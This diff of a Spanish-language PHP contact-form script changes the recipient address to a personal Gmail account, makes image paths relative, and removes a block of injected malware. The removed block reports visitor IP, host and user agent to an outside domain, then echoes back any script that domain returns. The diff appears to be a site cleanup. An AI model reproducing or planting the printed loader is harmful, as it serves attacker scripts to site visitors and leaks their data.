@@ -16,7 +16,7 @@ $asunto =$_POST["asunto"];
 
 $message =$_POST["message"];
 
-$para="contacto@ccbrand.co";
+$para="juliethcetina@gmail.com";
 
 
 $time = date("l dS of F Y h:i:s A"); 
@@ -61,7 +61,7 @@ $mensaje='<title>:: CCBRAND ::</title>
 
         <td width="500" height="106" align="center" valign="top">
         
-        <img src="http://www.ccbrand.co/images/email_respuesta_1.jpg" width="337" height="106" />
+        <img src="images/email_respuesta_1.jpg" width="337" height="106" />
         
         </td>
 
@@ -250,7 +250,7 @@ $mensajes='<title>.:: CCBRAND ::.</title>
 
       <tr>
 
-        <td width="337" height="268" valign="top" align="center"><img src="http://www.ccbrand.co/images/email_respuesta_4.jpg" width="300" height="94" />
+        <td width="337" height="268" valign="top" align="center"><img src="images/email_respuesta_4.jpg" width="300" height="94" />
         <p style="font-family:Tahoma, Geneva, sans-serif">Gracias por escribirnos, le estaremos<br />
         respondiendo lo antes posible</p></td>
 
@@ -277,15 +277,5 @@ $mensajes='<title>.:: CCBRAND ::.</title>
 
 mail($email,$motivo2,$mensajes,$header); 
 
-?>
-<?php
-#4957aa#
-error_reporting(0); @ini_set('display_errors',0); $wp_w13884 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_w13884) && !preg_match ('/bot/i', $wp_w13884))){
-$wp_w0913884="http://"."error"."style".".com/"."style"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_w13884);
-if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_w0913884); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-$wp_13884w = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_13884w = @file_get_contents($wp_w0913884);}
-elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_13884w=@stream_get_contents(@fopen($wp_w0913884, "r"));}}
-if (substr($wp_13884w,1,3) === 'scr'){ echo $wp_13884w; }
-#/4957aa#
 ?>
 
